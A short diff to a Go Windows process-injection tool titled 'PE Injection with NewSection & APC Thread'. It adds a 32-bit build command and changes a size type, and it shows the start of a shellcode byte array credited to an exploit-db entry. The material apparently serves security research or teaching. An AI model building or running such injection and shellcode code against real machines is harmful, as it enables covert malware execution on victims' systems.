@@ -7,6 +7,7 @@ Title:    	   Golang Windows PE Injeciton with NewSection & APC Thread
 Release date:  07/12/2021
 Author:		   Amanda Rousseau (Malware Unicorn)
 Tested on: 	   Win10 amd64
+Use: GOOS=windows GOARCH=386 go build .
 */
 package main
 
@@ -294,7 +295,7 @@ func main() {
 	if err != nil {
 		log.Fatalln(err)
 	}
-	var testSize uint64 = 512
+	var testSize uint32 = 512
 	//testBuff := []byte("HELLO WORLD!")
 	// REF: https://www.exploit-db.com/exploits/28996
 	shellcodeBuff := []byte("\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42" +
